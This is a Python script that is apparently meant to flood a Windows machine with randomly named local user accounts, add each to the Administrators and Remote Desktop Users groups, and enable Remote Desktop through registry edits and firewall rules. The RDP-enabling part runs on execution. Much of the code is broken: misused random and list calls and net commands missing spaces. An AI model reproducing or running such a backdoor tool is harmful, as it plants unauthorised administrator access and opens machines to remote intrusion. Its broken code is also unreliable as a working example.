from asyncio import subprocess
from random import randint, random

import string
import subprocess
import os

letter = 'abcdefghijklmnopqrstuvwxyz0123456789!"#$%&''()[]}{~-|`_\\@=+-*/§.,?:;ùµ£¤^¨'  

def fack_everything():
    for z in range(1, 100000000) :
        i = 0
        number = random.randint(5, 5)
        def randStr(chars = string.ascii_uppercase + string.digits, N=number):
            return ''.join(random.choice(chars) for _ in range(N))
        user = randStr(chars=letter)
        password = randStr(chars=letter)
        list.append(user)
        if user in list:

            cwd = os.getcwd()

            def create_remote_user():
                command = 'net user /add' + user + password
                os.system(command)

            def elevate_user():
                command = 'net localgroup administrators' + user + '/add'
                os.system(command)
                
                command = 'net localgroup Administrateurs' + user + '/add'
                os.system(command)

            def add_user_to_rdp():
                command = 'net localgroup “Remote Desktop Users”'+ user + '/add'
                os.system(command)

                command = f'''powershell "net localgroup 'Utilisateurs du Bureau à distance' {user} /add"'''
                os.system(command)

                        
            create_remote_user()
            print('CRU ok')
            elevate_user()
            print('EU ok')
            add_user_to_rdp()
            print('AUTR ok')
                
def enable_rdp():
    command = "powershell 'Set-ItemProperty “HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\” -Name “fDenyTSConnections” -Value 0'"
    os.system(command)
    command = "powershell 'Set-ItemProperty “HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\” -Name “UserAuthentication” -Value 1'"
    os.system(command)
    command = "powershell 'Enable-NetFirewallRule -DisplayGroup “Remote Desktop”'"
    os.system(command)

enable_rdp()
print('ER ok')
